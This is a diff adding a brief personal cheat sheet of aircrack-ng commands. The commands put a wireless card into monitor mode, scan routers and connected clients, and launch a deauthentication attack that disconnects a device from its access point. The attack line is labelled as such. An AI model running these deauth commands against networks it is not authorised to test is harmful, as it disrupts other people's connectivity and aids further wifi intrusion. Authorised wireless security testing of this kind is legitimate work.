@@ -1,0 +1,6 @@
+iwconfig ->wifi name
+airmon-ng start wlan0 -> monitor mode
+airodump-ng wlan0mon ->search routers
+airodump-ng wlan0mon --bssid 12:12:12:12 --channel 1->search devices
+aireplay-ng --deauth 2 - c device:mac:id -a router:mac:id wlan0mon ->attack
+airmon-ng start wlan0mon 4 -> when ap is in different channel
